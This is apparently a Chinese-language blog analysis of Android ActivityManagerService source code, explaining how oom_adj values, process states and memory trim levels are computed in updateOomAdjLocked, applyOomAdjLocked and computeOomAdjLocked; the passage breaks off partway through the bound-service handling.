三、源代码分析## （一） ActivityManagerService.java### 1. updateConfiguration方法```javapublic void updateConfiguration(Configuration values) { enforceCallingPermission(android.Manifest.permission.CHANGE_CONFIGURATION, &quot;updateConfiguration()&quot;); synchronized(this) { if (values == null &amp;&amp; mWindowManager != null) { values = mWindowManager.computeNewConfiguration(); } if (mWindowManager != null) { mProcessList.applyDisplaySize(mWindowManager); } final long origId = Binder.clearCallingIdentity(); if (values != null) { Settings.System.clearConfiguration(values); } updateConfigurationLocked(values, null, false, false); Binder.restoreCallingIdentity(origId); } } 这里 updateConfiguration 是 ActivityManagerService (AMS) 对外提供的 binder 接口，调用后可以更新窗口的配置。 # 2. applyOomAdjLocked 方法 2.1 applyOomAdjLocked 方法执行在 updateOomAdjLocked 中，最终通过它把 computeOomAdjLocked 和 updateOomAdjLocked 计算好的 adj 更新并保存。时序图如下： 2.2 源码分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475private final boolean applyOomAdjLocked(ProcessRecord app, boolean doingAll, long now, long nowElapsed) { boolean success = true; if (app.curRawAdj != app.setRawAdj) { app.setRawAdj = app.curRawAdj; } int changes = 0; //curAdj是computeOomAdjLocked计算出的adj值，赋值给setAdj， //并且调用ProcessList.setOomAdj方法 if (app.curAdj != app.setAdj) { ProcessList.setOomAdj(app.pid, app.info.uid, app.curAdj); if (DEBUG_SWITCH || DEBUG_OOM_ADJ) Slog.v(TAG_OOM_ADJ, &quot;Set &quot; + app.pid + &quot; &quot; + app.processName + &quot; adj &quot; + app.curAdj + &quot;: &quot; + app.adjType); app.setAdj = app.curAdj; } //当schedGroup在ProcessList.SCHED_GROUP_TOP_APP跟非ProcessList.SCHED_GROUP_TOP_APP间切换时调用Process.setThreadPriority(int tid,int priority)，即应用进入前台和退出前台时改变UI相关线程优先级，这里的UI相关线程包括主线程和RenderThread，以提升用户界面的响应速度。 if (app.setSchedGroup != app.curSchedGroup) { app.setSchedGroup = app.curSchedGroup; if (DEBUG_SWITCH || DEBUG_OOM_ADJ) Slog.v(TAG_OOM_ADJ, &quot;Setting process group of &quot; + app.processName + &quot; to &quot; + app.curSchedGroup); if (app.waitingToKill != null &amp;&amp; app.curReceiver == null &amp;&amp; app.setSchedGroup == Process.THREAD_GROUP_BG_NONINTERACTIVE) { app.kill(app.waitingToKill, true); success = false; } else { if (true) { long oldId = Binder.clearCallingIdentity(); try { Process.setProcessGroup(app.pid, app.curSchedGroup); } catch (Exception e) { Slog.w(TAG, &quot;Failed setting process group of &quot; + app.pid + &quot; to &quot; + app.curSchedGroup); e.printStackTrace(); } finally { Binder.restoreCallingIdentity(oldId); } } else { if (app.thread != null) { try { app.thread.setSchedulingGroup(app.curSchedGroup); } catch (RemoteException e) { } } } Process.setSwappiness(app.pid, app.curSchedGroup &lt;= Process.THREAD_GROUP_BG_NONINTERACTIVE); } } ... //调用了进程ApplicationThread的setProcessState方法 //调用Process.setProcessGroup(int pid,int group)设置进程调度策略，native层代码原理就是利用linux的cgroup机制，将进程根据状态放入预先设定的cgroup分组中，这些分组包含了对cpu使用率、cpuset、cpu调频等子资源的配置，已满足特定状态进程对系统资源的需求。 if (app.repProcState != app.curProcState) { app.repProcState = app.curProcState; changes |= ProcessChangeItem.CHANGE_PROCESS_STATE; if (app.thread != null) { try { if (false) { //RuntimeException h = new RuntimeException(&quot;here&quot;); Slog.i(TAG, &quot;Sending new process state &quot; + app.repProcState + &quot; to &quot; + app /*, h*/); } app.thread.setProcessState(app.repProcState); } catch (RemoteException e) { } } } ... return success; } # 3. updateOomAdjLocked 无参方法 updateOomAdjLocked 方法在应用进程的组件运行状态发生改变时被调用，比如有 Service 启动，有广播接收者收到广播，有 Activity 启动等。因为进程的重要性的计算就依赖于组件运行状态，既然组件运行状态发生了改变，就应该实时更新。 3.1 执行 oom 更新之前一些基本参数的初始化重置: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849final void updateOomAdjLocked() { final ActivityRecord TOP_ACT = resumedAppLocked(); //获取当前 final ProcessRecord TOP_APP = TOP_ACT != null ? TOP_ACT.app : null; final long now = SystemClock.uptimeMillis(); //系统开机不包括睡眠时间 final long nowElapsed = SystemClock.elapsedRealtime(); //系统开机时间 final long oldTime = now - ProcessList.MAX_EMPTY_TIME; //MAX_EMPTY_TIME是系统控制空进程能够保存的最大时间 final int N = mLruProcesses.size(); //lru集合中进程的数量 ... mAdjSeq++; //记录执行该方法的次数 mNewNumServiceProcs = 0; mNewNumAServiceProcs = 0; //系统默认CUR_MAX_EMPTY_PROCESSES=16,CUR_MAX_CACHED_PROCESSES=32 final int emptyProcessLimit = mConstants.CUR_MAX_EMPTY_PROCESSES; final int cachedProcessLimit = mConstants.CUR_MAX_CACHED_PROCESSES - emptyProcessLimit; //将adj在900～906之间的进程分为numSlots部分 //900～906只有7个数字可用，但是adj位于该范围的进程数量往往远远不只 int numSlots = (ProcessList.CACHED_APP_MAX_ADJ - ProcessList.CACHED_APP_MIN_ADJ + 1) / 2;//=3 //N = mNumNonCachedProcs + mNumCachedHiddenProcs + numEmptyProcs //lru集合的大小 = 非缓存进程+缓存进程+空进程 int numEmptyProcs = N - mNumNonCachedProcs - mNumCachedHiddenProcs; if (numEmptyProcs &gt; cachedProcessLimit) { numEmptyProcs = cachedProcessLimit;//保证空进程的数量在阈值内 } mEmptyRemainingCapacity = emptyProcessLimit - numEmptyProcs;//空进程剩余的容量 int emptyFactor = numEmptyProcs/numSlots;//空进程的计算因子 if (emptyFactor &lt; 1) emptyFactor = 1;//保证最小为1 //缓存进程的计算因子 int cachedFactor = (mNumCachedHiddenProcs &gt; 0 ? mNumCachedHiddenProcs : 1)/numSlots; if (cachedFactor &lt; 1) cachedFactor = 1;//保证最小为1 int stepCached = 0;//代表每一个slot的深度，下同 int stepEmpty = 0; int numCached = 0;//缓存进程的数量 int numEmpty = 0;//空进程的数量 int numTrimming = 0;//重要性低于home的后台进程数量 //以上的一些计算因子，都是动态变化的，会随着对应的进程数量变化，决定着每一个slot中进程的step mNumNonCachedProcs = 0;//重设全局变量非缓存进程大小为0 mNumCachedHiddenProcs = 0;//重设全局变量缓存进程大小为0 int curCachedAdj = ProcessList.CACHED_APP_MIN_ADJ;//在计算开始时，缓存进程的adj开始为900 int nextCachedAdj = curCachedAdj+1;//下一个为901 int curEmptyAdj = ProcessList.CACHED_APP_MIN_ADJ;//在计算开始时，空进程的adj开始900 int nextEmptyAdj = curEmptyAdj+2;//下一个为902 boolean retryCycles = false;//标记再次进行循环 ... 3.2 调用 computeOomAdjLocked 方法计算进程的 oom 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849for (int i=N-1; i&gt;=0; i--) { ProcessRecord app = mLruProcesses.get(i); if (!app.killedByAm &amp;&amp; app.thread != null) { app.procStateChanged = false; //计算app进程的adj computeOomAdjLocked(app, ProcessList.UNKNOWN_ADJ, TOP_APP, true, now); //当执行完computeOomAdjLocked之后，对于缓存进程和空进程的app，如果发现还未进行adj设置，需要修改成正确的adj值 if (app.curAdj &gt;= ProcessList.UNKNOWN_ADJ) { switch (app.curProcState) { case ActivityManager.PROCESS_STATE_CACHED_ACTIVITY: case ActivityManager.PROCESS_STATE_CACHED_ACTIVITY_CLIENT: case ActivityManager.PROCESS_STATE_CACHED_RECENT: //处理缓存进程 app.curRawAdj = curCachedAdj; app.curAdj = app.modifyRawOomAdj(curCachedAdj); if (DEBUG_LRU &amp;&amp; false) Slog.d(TAG_LRU, &quot;Assigning activity LRU #&quot; + i + &quot; adj: &quot; + app.curAdj + &quot; (curCachedAdj=&quot; + curCachedAdj + &quot;)&quot;); if (curCachedAdj != nextCachedAdj) { stepCached++;//从这部分逻辑可以看出stepCached应该是表示一个深度 if (stepCached &gt;= cachedFactor) {//cachedFactor用来表示每一个slot的最大深度 stepCached = 0;//在一个slot内，他们的adj值是一样的 curCachedAdj = nextCachedAdj;//下一个slot的adj值 nextCachedAdj += 2; if (nextCachedAdj &gt; ProcessList.CACHED_APP_MAX_ADJ) { //保证缓存进程和空进程的adj在900～906之间 nextCachedAdj = ProcessList.CACHED_APP_MAX_ADJ; } } } break; default://处理空进程 app.curRawAdj = curEmptyAdj; app.curAdj = app.modifyRawOomAdj(curEmptyAdj); ... // Cycle strategy:循环策略 int cycleCount = 0; while (retryCycles) { cycleCount++; retryCycles = false; for (int i=0; i&lt;N; i++) { ProcessRecord app = mLruProcesses.get(i); if (!app.killedByAm &amp;&amp; app.thread != null &amp;&amp; app.containsCycle == true) { app.adjSeq--; app.completedAdjSeq--; } } ... 3.3 调用 applyOomAdjLocked 设置进程的 oom 12345678910111213141516171819202122232425262728293031323334353637383940//计算完毕之后，进行设置app的oom for (int i=N-1; i&gt;=0; i--) { ProcessRecord app = mLruProcesses.get(i); if (!app.killedByAm &amp;&amp; app.thread != null) { applyOomAdjLocked(app, true, now, nowElapsed); //计算各个类型进程的数量 switch (app.curProcState) { case ActivityManager.PROCESS_STATE_CACHED_ACTIVITY: mNumCachedHiddenProcs++; numCached++; //超过限制，杀进程回收资源 if (numCached &gt; cachedProcessLimit) { app.kill(&quot;cached #&quot; + numCached, true); } break; case ActivityManager.PROCESS_STATE_CACHED_EMPTY: //超过限制，杀进程回收资源 if (numEmpty &gt; mConstants.CUR_TRIM_EMPTY_PROCESSES &amp;&amp; app.lastActivityTime &lt; oldTime) { app.kill(&quot;empty for &quot; + ((oldTime + ProcessList.MAX_EMPTY_TIME - app.lastActivityTime) / 1000) + &quot;s&quot;, true); } else { numEmpty++; if (numEmpty &gt; emptyProcessLimit) { app.kill(&quot;empty #&quot; + numEmpty, true); } } break; default: mNumNonCachedProcs++; break; } ... if (app.curProcState &gt;= ActivityManager.PROCESS_STATE_HOME &amp;&amp; !app.killedByAm) { numTrimming++;//重要性低于Home的进程 } } } 1.1 当执行完上述代码后，根据执行结果设置当前的内存等级，并根据当前的内存等级主动去回收内存 public static final int ADJ_MEM_FACTOR_NORMAL=0;// 正常等级 public static final int ADJ_MEM_FACTOR_MODERATE=1;// 中等等级 public static final int ADJ_MEM_FACTOR_LOW=2;// 存在低内存 public static final int ADJ_MEM_FACTOR_CRITICAL=3;// 严重低内存 对应的更细节的内存回收策略如下： TRIM_MEEMORY_COMPLETTE=80 TRIM_MEEMORY_MODERATE=60 TRIM_MEEMORY_BACKGROUND=40 TRIM_MEEMORY_UI_HIDDEN=20 TRIM_MEEMORY_RUNNING_CRITICAL=15，对应 ADJ_MEM_FACTOR_CRITICAL TRIM_MEEMORY_RUNNING_LOW=10，对应 ADJ_MEM_FACTOR_LOW TRIM_MEEMORY_RUNNING_MODERATE=5，对应 ADJ_MEM_FACTOR_MODERATE 和 ADJ_MEM_FACTOR_NORMAL 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596 mNumServiceProcs = mNewNumServiceProcs; final int numCachedAndEmpty = numCached + numEmpty;//缓存进程和空进程的数量和 int memFactor;//内存等级计算因子 if (numCached &lt;= mConstants.CUR_TRIM_CACHED_PROCESSES &amp;&amp; numEmpty &lt;= mConstants.CUR_TRIM_EMPTY_PROCESSES) {//缓存进程和空进程的数量都低于对应的规定阀值 if (numCachedAndEmpty &lt;= ProcessList.TRIM_CRITICAL_THRESHOLD) {//同时他们的总和低于极端情况下的阀值 //缓存进程和空进程的数量很少，并且总和也很少，此情况很极端 memFactor = ProcessStats.ADJ_MEM_FACTOR_CRITICAL;//设置内存等级严重 } else if (numCachedAndEmpty &lt;= ProcessList.TRIM_LOW_THRESHOLD) { //缓存进程和空进程的数量很少，但总和还行，我们认为此时的情况仅次于极端情况 memFactor = ProcessStats.ADJ_MEM_FACTOR_LOW; } else { //缓存进程和空进程的数量很少，但总和不错，认为该情况为中级 memFactor = ProcessStats.ADJ_MEM_FACTOR_MODERATE; } } else {//缓存进程和空进程的数量正常，该情况为正常 memFactor = ProcessStats.ADJ_MEM_FACTOR_NORMAL; } if (DEBUG_OOM_ADJ) Slog.d(TAG_OOM_ADJ, &quot;oom: memFactor=&quot; + memFactor + &quot; last=&quot; + mLastMemoryLevel + &quot; allowLow=&quot; + mAllowLowerMemLevel + &quot; numProcs=&quot; + mLruProcesses.size() + &quot; last=&quot; + mLastNumProcesses); //memFactor取值在0-3之间，越大代表内存越紧张 if (memFactor &gt; mLastMemoryLevel) { if (!mAllowLowerMemLevel || mLruProcesses.size() &gt;= mLastNumProcesses) { memFactor = mLastMemoryLevel; if (DEBUG_OOM_ADJ) Slog.d(TAG_OOM_ADJ, &quot;Keeping last mem factor!&quot;); } } if (memFactor != mLastMemoryLevel) { EventLogTags.writeAmMemFactor(memFactor, mLastMemoryLevel); } mLastMemoryLevel = memFactor; mLastNumProcesses = mLruProcesses.size(); //设置内存等级成功返回true boolean allChanged = mProcessStats.setMemFactorLocked(memFactor, !isSleepingLocked(), now); final int trackerMemFactor = mProcessStats.getMemFactorLocked(); if (memFactor != ProcessStats.ADJ_MEM_FACTOR_NORMAL) {//当前的内存等级不正常 if (mLowRamStartTime == 0) { mLowRamStartTime = now;//记录时间 } int step = 0; int fgTrimLevel; switch (memFactor) { case ProcessStats.ADJ_MEM_FACTOR_CRITICAL: fgTrimLevel = ComponentCallbacks2.TRIM_MEMORY_RUNNING_CRITICAL; break; case ProcessStats.ADJ_MEM_FACTOR_LOW: fgTrimLevel = ComponentCallbacks2.TRIM_MEMORY_RUNNING_LOW; break; default: fgTrimLevel = ComponentCallbacks2.TRIM_MEMORY_RUNNING_MODERATE; break; } int factor = numTrimming/3;//原理同上 int minFactor = 2; if (mHomeProcess != null) minFactor++; if (mPreviousProcess != null) minFactor++; if (factor &lt; minFactor) factor = minFactor; int curLevel = ComponentCallbacks2.TRIM_MEMORY_COMPLETE;//默认设置最高的回收等级 //这个循环为逆序遍历。因为LRU集合中越在后面的进程，优先级越高，代表用户使用的频率高 //该进程在LRU集合的位置就越靠后，也就意味着其占有的内存也较多，因此他就越需要进行内存回收。 for (int i=N-1; i&gt;=0; i--) { ProcessRecord app = mLruProcesses.get(i); if (allChanged || app.procStateChanged) { setProcessTrackerStateLocked(app, trackerMemFactor, now); app.procStateChanged = false; } if (app.curProcState &gt;= ActivityManager.PROCESS_STATE_HOME &amp;&amp; !app.killedByAm) {//procstate &gt;= 13 //进程优先级大于Home进程，也可以认为adj&gt;=600，也就是相对于用户重要程度低于Home进程 if (app.trimMemoryLevel &lt; curLevel &amp;&amp; app.thread != null) { //当前进程的内存回收等级小于当前的内存回收等级，说明之前内存情况较好，现在需要进行内存回收 try { if (DEBUG_SWITCH || DEBUG_OOM_ADJ) Slog.v(TAG_OOM_ADJ, &quot;Trimming memory of &quot; + app.processName + &quot; to &quot; + curLevel); app.thread.scheduleTrimMemory(curLevel); } catch (RemoteException e) { } ... app.trimMemoryLevel = curLevel; step++; if (step &gt;= factor) {//回收一定程度(即处理完一个slot之后)，按需要降低内存回收等级 step = 0; switch (curLevel) { case ComponentCallbacks2.TRIM_MEMORY_COMPLETE: curLevel = ComponentCallbacks2.TRIM_MEMORY_MODERATE; break; case ComponentCallbacks2.TRIM_MEMORY_MODERATE: curLevel = ComponentCallbacks2.TRIM_MEMORY_BACKGROUND; break; } } } ... 3.5 重新计算进程的 PSS 值，外加一些额外的结束工作 Item 全称 含义 等价 USS Unique Set Size 物理内存 进程独占的内存 PSS Proportional Set Size 物理内存 PSS=USS + 按比例包含共享库 RSS Resident Set Size 物理内存 RSS=USS + 包含共享库 VSS Virtual Set Size 虚拟内存 VSS=RSS + 未分配实际物理内存 以 SystemUI 进程来说： USS：SytemUI 进程实际占用的物理内存 PSS：SystemUI 进程实际占用的物理内存加上 SystemUI 的共享库占用的内存 RSS：SystemUI 进程实际占用的物理内存加上所有共享库占用的内存 VSS：通常不关注 一般来说内存占用大小有如下规律：VSS&gt;=RSS&gt;=PSS&gt;=USS 1234567891011121314if (mAlwaysFinishActivities) { mStackSupervisor.scheduleDestroyAllActivities(null, &quot;always-finish&quot;);}ArrayList&lt;UidRecord&gt; becameIdle = null;if (mLocalPowerManager != null) { mLocalPowerManager.startUidChanges();} ...if (becameIdle != null) { for (int i = becameIdle.size() - 1; i &gt;= 0; i--) { mServices.stopInBackgroundLocked(becameIdle.get(i).uid); }} ... # 4. computeOomAdjLocked 方法 ​ computeOomAdjLocked 函数根据一定规则计算出三个状态值，这个规则与 Android 将进程划分的 5 个优先级有关系，即前台进程、可见进程、服务进程、后台进程、空进程。下面我们对 computeOomAdjLocked 函数进行分段研究。 4.1 根据参数及进程的状态，决定是否需要进行后续的计算，并初始化一些变量。 123456789101112131415161718192021222324252627282930313233private final int computeOomAdjLocked(ProcessRecord app, int cachedAdj, ProcessRecord TOP_APP, boolean doingAll, long now) { //updateOomAdjLocked函数每次更新oom_adj时，都会分配一个序号 //此处就是根据序号判断是否已经处理过命令 if (mAdjSeq == app.adjSeq) { // This adjustment has already been computed. return app.curRawAdj; } //ProcessRecord对应的ActivityThread不存在了 //修改其中的一些变量，此时的oom_adj为CACHED_APP_MAX_ADJ， if (app.thread == null) { app.adjSeq = mAdjSeq; app.curSchedGroup = ProcessList.SCHED_GROUP_BACKGROUND; app.curProcState = ActivityManager.PROCESS_STATE_CACHED_EMPTY; return (app.curAdj=app.curRawAdj=ProcessList.CACHED_APP_MAX_ADJ); } //初始化一些变量 app.adjTypeCode = ActivityManager.RunningAppProcessInfo.REASON_UNKNOWN; app.adjSource = null; app.adjTarget = null; app.empty = false; app.cached = false; final int activitiesSize = app.activities.size(); // ProcessRecord中只有初始化时为maxAdj赋值 //maxAdj取值为UNKNOWN_ADJ，即最大的1001 if (app.maxAdj &lt;= ProcessList.FOREGROUND_APP_ADJ) { //这部分代码就是修改app的curSchedGroup，并将oom_adj设置为maxAdj ... } //保存当前TOP Activity的状态 final int PROCESS_STATE_CUR_TOP = mTopProcessState; ...} 4.2 1.1 这部分代码包含前台 Activity 的进程，运行测试类的进程、处理广播的进程以及包含正在运行服务的进程，其中 oom_adj 都被赋值为 FOREGROUND_APP_ADJ。从 LMK 的角度看，它们的重要性是一致的，但这些进程的 proState 不同，于是从 AMS 主动回收内存的角度来看，它们的重要性不同。 对于其它种类的进程，这部分代码先将它们的 oom_adj 设置为 UNKNOW_ADJ，proc_state 设置为 PROCESS_STATE_CACHED_EMPTY，在后续的流程中再作进一步处理。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647...int adj;int schedGroup;int procState;boolean foregroundActivities = false;BroadcastQueue queue;//若进程包含正在前台显示的Activityif (app == TOP_APP) { // The last app on the list is the foreground app. adj = ProcessList.FOREGROUND_APP_ADJ; //单独的一种schedGroup schedGroup = ProcessList.SCHED_GROUP_TOP_APP; app.adjType = &quot;top-activity&quot;; //当前处理的是包含前台Activity的进程时，才会将该值置为true foregroundActivities = true; procState = PROCESS_STATE_CUR_TOP;} else if (app.instrumentationClass != null) { //处理正在进行测试的进程 // Don't want to kill running instrumentation. adj = ProcessList.FOREGROUND_APP_ADJ; schedGroup = ProcessList.SCHED_GROUP_DEFAULT; app.adjType = &quot;instrumentation&quot;; procState = ActivityManager.PROCESS_STATE_FOREGROUND_SERVICE;} else if ((queue = isReceivingBroadcast(app)) != null) { //处理正在处理广播的进程 adj = ProcessList.FOREGROUND_APP_ADJ; //根据处理广播的Queue，决定调度策略 schedGroup = (queue == mFgBroadcastQueue) ? ProcessList.SCHED_GROUP_DEFAULT : ProcessList.SCHED_GROUP_BACKGROUND; app.adjType = &quot;broadcast&quot;; procState = ActivityManager.PROCESS_STATE_RECEIVER;} else if (app.executingServices.size() &gt; 0) { //处理Service正在运行的进程 adj = ProcessList.FOREGROUND_APP_ADJ; schedGroup = app.execServicesFg ? ProcessList.SCHED_GROUP_DEFAULT : ProcessList.SCHED_GROUP_BACKGROUND; procState = ActivityManager.PROCESS_STATE_SERVICE;} else { //其它进程，在后续过程中再进一步处理 // 先将adj临时赋值为cachedAdj，即参数传入的UNKNOW_ADJ adj = cachedAdj; procState = ActivityManager.PROCESS_STATE_CACHED_EMPTY; app.cached = true; app.empty = true; app.adjType = &quot;cch-empty&quot;;}... 4.3 这部分代码主要处理包含 Activity，但是 Activity 不在前台的进程。注意到这些进程包括之前提到的正在处理广播、服务或测试的进程以及 oom_adj 暂时为 UNKNOW_ADJ 的进程。不过只有 UNKNOW_ADJ 对应的进程，才有可能进行实际的更新。进程中若存在可见 Activity 时，进程的 oom_adj 为 VISIBLE_APP_ADJ；否则若进程中存在处于 PAUSING、PAUSED 或 STOPPING 状态的 Activity 时，进程的 oom_adj 为 PERCEPTIBLE_APP_ADJ；其余的进程仍是 UNKNOW_ADJ。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182...if (!foregroundActivities &amp;&amp; activitiesSize &gt; 0) { //rankTaskLayersIfNeeded函数会更新包含Activity的Task的rankLayer //按照显示层次从上到下，rankLayer逐渐增加，对应的最大值就是VISIBLE_APP_LAYER_MAX int minLayer = ProcessList.VISIBLE_APP_LAYER_MAX; //依次轮询进程中的Activity for (int j = 0; j &lt; activitiesSize; j++) { final ActivityRecord r = app.activities.get(j); ... //如果进程包含可见Activity，即该进程是个可见进程 if (r.visible) { if (adj &gt; ProcessList.VISIBLE_APP_ADJ) { //之前提到的正在处理广播、服务或测试的进程，adj为FOREGROUND，是小于VISIBLE_APP_ADJ //因此不会在此更新 adj = ProcessList.VISIBLE_APP_ADJ; app.adjType = &quot;visible&quot;; } if (procState &gt; PROCESS_STATE_CUR_TOP) { //与oom_adj类似，在条件满足时，更新procState procState = PROCESS_STATE_CUR_TOP; } //正在处理广播、服务或测试的进程，如果它们的调度策略为BACKGROUND //但又包含了可见Activity时，调度策略变更为DEFAULT schedGroup = ProcessList.SCHED_GROUP_DEFAULT; app.cached = false; app.empty = false; foregroundActivities = true; if (r.task != null &amp;&amp; minLayer &gt; 0) { final int layer = r.task.mLayerRank; if (layer &gt;= 0 &amp;&amp; minLayer &gt; layer) { //更新ranklayer minLayer = layer; } } //发现可见Activity时，直接可以结束循环 break; } else if (r.state == ActivityState.PAUSING || r.state == ActivityState.PAUSED) { //如果进程包含处于PAUSING或PAUSED状态的Activity时 //将其oom_adj调整为“用户可察觉”的的等级，这个等级还是很高的 if (adj &gt; ProcessList.PERCEPTIBLE_APP_ADJ) { adj = ProcessList.PERCEPTIBLE_APP_ADJ; app.adjType = &quot;pausing&quot;; } if (procState &gt; PROCESS_STATE_CUR_TOP) { procState = PROCESS_STATE_CUR_TOP; } schedGroup = ProcessList.SCHED_GROUP_DEFAULT; app.cached = false; app.empty = false; foregroundActivities = true; //注意并不会break } else if (r.state == ActivityState.STOPPING) { //包含处于Stopping状态Activity的进程，其oom_adj也被置为PERCEPTIBLE_APP_ADJ if (adj &gt; ProcessList.PERCEPTIBLE_APP_ADJ) { adj = ProcessList.PERCEPTIBLE_APP_ADJ; app.adjType = &quot;stopping&quot;; } ... // 这种进程将被看作潜在的cached或empty进程 if (!r.finishing) { if (procState &gt; ActivityManager.PROCESS_STATE_LAST_ACTIVITY) { procState = ActivityManager.PROCESS_STATE_LAST_ACTIVITY; } } app.cached = false; app.empty = false; foregroundActivities = true; } else { //只是含有cached-activity的进程，仅调整procState if (procState &gt; ActivityManager.PROCESS_STATE_CACHED_ACTIVITY) { procState = ActivityManager.PROCESS_STATE_CACHED_ACTIVITY; app.adjType = &quot;cch-act&quot;; } } if (adj == ProcessList.VISIBLE_APP_ADJ) { //不同可见进程的oom_adj有一定的差异，处在下层的oom_adj越大 //即存在时间越长的Activity所在进程，重要性越低 adj += minLayer; } }}... 4.4 该部分代码主要用于处理一些特殊的进程 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172...if (adj &gt; ProcessList.PERCEPTIBLE_APP_ADJ || procState &gt; ActivityManager.PROCESS_STATE_FOREGROUND_SERVICE) { //进程包含前台服务或被强制在前台运行时 //oom_adj被调整为PERCEPTIBLE_APP_ADJ，只是procState略有不同 if (app.foregroundServices) { adj = ProcessList.PERCEPTIBLE_APP_ADJ; procState = ActivityManager.PROCESS_STATE_FOREGROUND_SERVICE; app.cached = false; app.adjType = &quot;fg-service&quot;; schedGroup = ProcessList.SCHED_GROUP_DEFAULT; } else if (app.forcingToForeground != null) { adj = ProcessList.PERCEPTIBLE_APP_ADJ; procState = ActivityManager.PROCESS_STATE_IMPORTANT_FOREGROUND; app.cached = false; app.adjType = &quot;force-fg&quot;; app.adjSource = app.forcingToForeground; schedGroup = ProcessList.SCHED_GROUP_DEFAULT; }}//AMS的HeavyWeight进程单独处理if (app == mHeavyWeightProcess) { if (adj &gt; ProcessList.HEAVY_WEIGHT_APP_ADJ) { adj = ProcessList.HEAVY_WEIGHT_APP_ADJ; schedGroup = ProcessList.SCHED_GROUP_BACKGROUND; app.cached = false; app.adjType = &quot;heavy&quot;; } if (procState &gt; ActivityManager.PROCESS_STATE_HEAVY_WEIGHT) { procState = ActivityManager.PROCESS_STATE_HEAVY_WEIGHT; }}//home进程特殊处理if (app == mHomeProcess) { if (adj &gt; ProcessList.HOME_APP_ADJ) { adj = ProcessList.HOME_APP_ADJ; schedGroup = ProcessList.SCHED_GROUP_BACKGROUND; app.cached = false; app.adjType = &quot;home&quot;; } if (procState &gt; ActivityManager.PROCESS_STATE_HOME) { procState = ActivityManager.PROCESS_STATE_HOME; }}//前台进程之前的一个进程if (app == mPreviousProcess &amp;&amp; app.activities.size() &gt; 0) { if (adj &gt; ProcessList.PREVIOUS_APP_ADJ) { adj = ProcessList.PREVIOUS_APP_ADJ; schedGroup = ProcessList.SCHED_GROUP_BACKGROUND; app.cached = false; app.adjType = &quot;previous&quot;; } if (procState &gt; ActivityManager.PROCESS_STATE_LAST_ACTIVITY) { procState = ActivityManager.PROCESS_STATE_LAST_ACTIVITY; }}app.adjSeq = mAdjSeq;app.curRawAdj = adj;app.hasStartedServices = false;//处理正在进行backup工作的进程if (mBackupTarget != null &amp;&amp; app == mBackupTarget.app) { if (adj &gt; ProcessList.BACKUP_APP_ADJ) { ... adj = ProcessList.BACKUP_APP_ADJ; if (procState &gt; ActivityManager.PROCESS_STATE_IMPORTANT_BACKGROUND) { procState = ActivityManager.PROCESS_STATE_IMPORTANT_BACKGROUND; } app.adjType = &quot;backup&quot;; app.cached = false; }... 至此，我们可以看出 computeOomAdjLocked 处理一个进程时，按照重要性由高到低的顺序，逐步判断该进程是否满足对应的条件。尽管计算一个进程的 oom_adj 时会经过上述所有的判断，但当一个进程已经满足重要性较高的条件时，后续的判断实际上不会更改它已经获得的 oom_adj。上述代码的逻辑图如下所示： 4.5 该部分代码主要是处理包含服务的进程，进一步分段说明。 4.5.1 Unbounded Service 的处理 当进程中包含 Unbounded Service 时，进程的 oom_adj 先按照 Unbounded Service 的处理方式进行调整。 1234567891011121314151617181920212223242526272829303132333435363738...//依次处理进程中的每一个Servicefor (int is = app.services.size()-1; is &gt;= 0 &amp;&amp; (adj &gt; ProcessList.FOREGROUND_APP_ADJ || schedGroup == ProcessList.SCHED_GROUP_BACKGROUND || procState &gt; ActivityManager.PROCESS_STATE_TOP); is--) { ServiceRecord s = app.services.valueAt(is); //Service被已Unbounded Service的方式启动过 if (s.startRequested) { app.hasStartedServices = true; //调整procState if (procState &gt; ActivityManager.PROCESS_STATE_SERVICE) { procState = ActivityManager.PROCESS_STATE_SERVICE; } if (app.hasShownUi &amp;&amp; app != mHomeProcess) { // 仅有含有服务且显示过UI的进程，由于其占用内存可能较多，因此需要尽早回收 // 故此处不调整其oom_adj if (adj &gt; ProcessList.SERVICE_ADJ) { app.adjType = &quot;cch-started-ui-services&quot;; } } else { if (now &lt; (s.lastActivity + ActiveServices.MAX_SERVICE_INACTIVITY)) { //MAX_SERVICE_INACTIVITY为activity启动service后，系统最多保留Service的时间 //此时进程的oom_adj就可以被调整为后台服务对应的SERVICE_ADJ //adj大于500的进程均会受此判断的影响 if (adj &gt; ProcessList.SERVICE_ADJ) { adj = ProcessList.SERVICE_ADJ; app.adjType = &quot;started-services&quot;; app.cached = false; } } //处理Service存在超时的情况，可见超时时也不会调整oom_adj if (adj &gt; ProcessList.SERVICE_ADJ) { app.adjType = &quot;cch-started-services&quot;; } } } 从上述代码可以看出，当进程中含有 Unbounded Service 时，如果进程之前没有启动过 UI，且 Unbounded Service 存活的时间没有超时，进程的 oom_adj 才能被调整为 SERVICE_ADJ；否则进程的 oom_adj 仍然是 UNKNOW_ADJ 或其他大于 500 的值。 4.5.2 Bounded Service 的处理 该部分代码表示进程按照 Unbounded Service 的方式调增 oom_adj，然后再按照 Bouneded Service 的方式进一步调整。若 Service 仅为 Unbounded Service 或 Bounded Service 中的一种时，computeOomAdjLocked 函数的第五部分只会按照一种方式调增 oom_adj。Bounded Service 的处理方式，远比 Unbounded Service 复杂，依赖于客户端的 oom_adj 和绑定服务时使用的 flag。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128... //如果该Service还被客户端Bounded，即是Bounded Service时 for (int conni = s.connections.size()-1; conni &gt;= 0 &amp;&amp; (adj &gt; ProcessList.FOREGROUND_APP_ADJ || schedGroup == ProcessList.SCHED_GROUP_BACKGROUND || procState &gt; ActivityManager.PROCESS_STATE_TOP); conni--) { ArrayList&lt;ConnectionRecord&gt; clist = s.connections.valueAt(conni); //客户端可以通过一个Connection以不同的参数绑定Service //因此，一个Service可以对应多个Connection，一个Connection又对应多个ConnectionRecord //这里依次处理每一个ConnectionRecord for (int i = 0; i &lt; clist.size() &amp;&amp; (adj &gt; ProcessList.FOREGROUND_APP_ADJ || schedGroup == 